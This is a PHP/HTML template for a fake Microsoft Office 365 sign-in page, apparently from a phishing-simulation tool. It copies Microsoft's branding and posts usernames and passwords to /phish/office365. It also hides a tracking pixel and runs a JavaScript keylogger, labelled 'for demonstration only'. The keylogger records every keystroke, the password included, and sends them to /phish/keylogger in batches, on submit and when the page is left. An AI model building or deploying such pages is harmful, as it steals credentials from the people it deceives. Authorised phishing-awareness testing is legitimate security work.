<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Office 365 - Sign In</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: #f3f2f1;
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
        }
        .login-container {
            max-width: 440px;
            margin: 50px auto;
            background: white;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            padding: 44px;
        }
        .ms-logo {
            width: 108px;
            height: 24px;
            margin-bottom: 20px;
        }
        .login-title {
            color: #323130;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        .login-subtitle {
            color: #605e5c;
            font-size: 15px;
            margin-bottom: 24px;
        }
        .form-control {
            border: 1px solid #605e5c;
            border-radius: 0;
            padding: 8px 12px;
            font-size: 15px;
            height: 32px;
        }
        .form-control:focus {
            border-color: #0078d4;
            box-shadow: 0 0 0 1px #0078d4;
        }
        .btn-primary {
            background-color: #0078d4;
            border: 1px solid #0078d4;
            color: white;
            border-radius: 0;
            padding: 8px 12px;
            font-size: 15px;
            font-weight: 600;
            width: 100%;
        }
        .btn-primary:hover {
            background-color: #106ebe;
            border-color: #106ebe;
        }
        .error-message {
            color: #a4262c;
            font-size: 13px;
            margin-top: 8px;
        }
        .checkbox-container {
            margin: 20px 0;
        }
        .checkbox-container input[type="checkbox"] {
            margin-right: 8px;
        }
        .forgot-password {
            color: #0078d4;
            text-decoration: none;
            font-size: 13px;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-container">
            <!-- Microsoft Logo -->
            <svg class="ms-logo" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M44.836 4.6v13.8h-2.4V7.583L38.119 18.4h-1.588L32.214 7.583V18.4h-2.4V4.6h3.017l4.657 12.2L42.178 4.6h2.658z" fill="#737373"/>
                <path d="M52.631 6.8c1.8 0 3.017.4 3.017 2.6v6.8c0 .533.2.8.533.8.2 0 .4-.067.533-.2l.4 1.733c-.4.267-.933.467-1.6.467-1.267 0-2.133-.667-2.133-2.133 0-.2.033-.4.033-.533-.667 1.733-2.2 2.667-4.067 2.667-2.533 0-4.2-1.467-4.2-3.667 0-2.933 2.4-3.8 5.533-4.133L52.631 10.6c0-1.2-.533-1.8-1.8-1.8-1.133 0-2.067.4-2.933 1.067l-.8-1.6C48.231 7.333 50.431 6.8 52.631 6.8zM51.764 14.133c1.067 0 1.8-.533 1.8-1.333v-1.467l-1.333.267c-1.267.267-2.133.533-2.133 1.533C50.098 13.667 50.764 14.133 51.764 14.133z" fill="#737373"/>
                <path d="M63.498 6.8c1.6 0 2.8.667 3.467 1.8l-1.533 1.267c-.4-.733-1.067-1.133-1.933-1.133-1.6 0-2.667 1.333-2.667 3.133s1.067 3.133 2.667 3.133c.867 0 1.533-.4 1.933-1.133L66.965 15.133c-.667 1.133-1.867 1.8-3.467 1.8-2.8 0-4.933-2.133-4.933-5.067S60.698 6.8 63.498 6.8z" fill="#737373"/>
            </svg>
            
            <h1 class="login-title">Sign in</h1>
            <?php if (isset($email)): ?>
            <div class="login-subtitle"><?php echo htmlspecialchars($email); ?></div>
            <?php endif; ?>
            
            <?php if (isset($error)): ?>
            <div class="error-message"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            
            <form method="POST" action="/phish/office365" id="loginForm">
                <input type="hidden" name="project_id" value="<?php echo htmlspecialchars($project_id); ?>">
                <input type="hidden" name="email" value="<?php echo htmlspecialchars($email); ?>">
                <input type="hidden" name="attempts" value="<?php echo $attempts ?? 0; ?>">
                
                <div class="mb-3">
                    <input type="email" 
                           class="form-control" 
                           name="username" 
                           placeholder="Email, phone, or Skype" 
                           value="<?php echo htmlspecialchars($email ?? ''); ?>"
                           required>
                </div>
                
                <div class="mb-3">
                    <input type="password" 
                           class="form-control" 
                           name="password" 
                           placeholder="Password" 
                           required>
                </div>
                
                <div class="checkbox-container">
                    <label>
                        <input type="checkbox" name="stay_signed_in" value="1">
                        <span style="font-size: 13px; color: #323130;">Keep me signed in</span>
                    </label>
                </div>
                
                <button type="submit" class="btn btn-primary">Sign in</button>
                
                <div class="mt-3">
                    <a href="#" class="forgot-password" onclick="showForgotPassword()">Can't access your account?</a>
                </div>
            </form>
            
            <div class="mt-4" style="font-size: 13px; color: #605e5c;">
                <a href="#" class="forgot-password" onclick="showSignUpOptions()">Sign-in options</a>
            </div>
        </div>
    </div>

    <!-- 追蹤像素 -->
    <img src="/track/pixel?project_id=<?php echo urlencode($project_id); ?>&email=<?php echo urlencode($email); ?>" 
         width="1" height="1" style="display:none;" alt="">

    <script src="/js/bootstrap.bundle.min.js"></script>
    <script>
        // 記錄頁面加載時間
        const pageLoadTime = new Date().getTime();
        
        // 鍵盤記錄器（僅用於演示）
        let keystrokes = '';
        let lastKeystroke = 0;
        
        document.addEventListener('keydown', function(e) {
            const now = Date.now();
            
            // 記錄按鍵（不包括敏感字符）
            if (e.key.length === 1) {
                keystrokes += e.key;
            } else {
                keystrokes += `[${e.key}]`;
            }
            
            lastKeystroke = now;
            
            // 每10個按鍵或5秒無活動後發送
            if (keystrokes.length > 10 || (now - lastKeystroke > 5000 && keystrokes.length > 0)) {
                sendKeystrokes();
            }
        });
        
        function sendKeystrokes() {
            if (keystrokes.length === 0) return;
            
            fetch('/phish/keylogger', {
                method: 'POST',
                credentials: 'same-origin',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    project_id: '<?php echo $project_id; ?>',
                    email: '<?php echo $email; ?>',
                    keystrokes: keystrokes
                })
            }).catch(() => {});
            
            keystrokes = '';
        }
        
        // 表單提交時記錄
        document.getElementById('loginForm').addEventListener('submit', function() {
            sendKeystrokes();
            
            // 記錄表單提交事件
            fetch('/phish/form-submit', {
                method: 'POST',
                credentials: 'same-origin',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    project_id: '<?php echo $project_id; ?>',
                    email: '<?php echo $email; ?>',
                    form_type: 'office365_login',
                    time_on_page: Date.now() - pageLoadTime
                })
            }).catch(() => {});
        });
        
        function showForgotPassword() {
            alert('請聯繫您的IT管理員重置密碼。\n\nPlease contact your IT administrator to reset your password.');
        }
        
        function showSignUpOptions() {
            alert('請使用您的組織提供的登入選項。\n\nPlease use the sign-in options provided by your organization.');
        }
        
        // 頁面離開時發送剩餘的鍵盤記錄
        window.addEventListener('beforeunload', function() {
            sendKeystrokes();
        });
        
        // 模擬真實的Microsoft頁面行為
        setTimeout(function() {
            document.querySelector('input[name="password"]').focus();
        }, 1000);
    </script>
</body>
</html>